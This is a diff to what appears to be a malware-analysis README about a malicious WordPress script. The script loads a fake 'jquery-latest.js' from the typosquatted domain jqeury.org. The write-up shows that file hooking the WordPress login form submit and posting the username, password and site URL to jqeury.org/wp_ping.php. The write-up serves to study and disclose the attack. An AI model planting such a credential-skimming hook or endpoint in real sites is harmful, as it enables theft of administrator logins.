@@ -29,13 +29,14 @@ Right after that the code does a request to the same domain at the following pat
 jqeury.org/wp_ping.php?dname=wpd&tname=wpt&urliz=urlig
 ```
 
-What does it does? I'm not sure, since my knowledge os limited on this, but maybe requesting data from Wordpress ... something like the site url ... not sure yet
+What does it does? I'm not sure, since my knowledge is limited on this, but maybe the code is requesting data from Wordpress ... something like the site url ... not sure yet what or why ...
 
 #### Update 5
 Take a look at "[jqeury.org/jquery-latest.js](http://git.io/vs0c6)" on line 56 after using jsbeautifier on it, this was the result: [awful/glues_it/jquery-latest.js](http://git.io/vs0c6)
 
 At the beginning it looks like a regular jQuery Javascript file, but take a look at the lines 3349-3368, there is where the cute part begins. This file contains a script which "saves/sends (not sure if I'm correct)" the user/admin credentials using some method. I'm still looking.
 
+#### Update 6
 Here is the part that I'm talking about:
 ```sh
 $("#loginform").submit(function(event) {
@@ -60,7 +61,7 @@ $("#loginform").submit(function(event) {
 });
 ```
 
-I believe that is getting the data from the Wordpress login form (user, password, site domain and site url) and using Ajax with method POST and in someway sending it to http://jqeury.org/wp_ping.php where probably the creator of the script is saving it to a file where it can be read and then later on be used to log in to the victims site. This is just a vague expeculation of mine, again, my knowledge about this is limited.
+I believe that is getting the data from the Wordpress login form (user, password, site domain and site url) and using Ajax with method POST and in someway sending it to http://jqeury.org/wp_ping.php where probably the creator of the script is saving it to a file where it can be read and then later on be used to log in to the victims site. This is just a vague speculation of mine, since I'm just taking quick looks at this when I have time.
 
 I also found out that on line 145 of [awful/glues_it/glues_it_CLEANED.php](http://git.io/vs0cs) that there is a possible/interesting point, take a look at:
 ```sh
@@ -77,4 +78,4 @@ backwards (that is why at line 20 of [awful/glues_it/glues_it_CLEANED.php](http:
 wp-admin/includes/user.php
 ```
 
-I still don't know yet why the creator of this script uses that file, but maybe is using it to, in someway, get advantage of Wordpress own code to accomplish his goal of getting the victims site url, username and password.
+I still don't know yet why the creator of this script uses that file, but maybe is using it to, in someway, to get advantage of Wordpress own code to accomplish his goal of getting the victims site url, username and password.
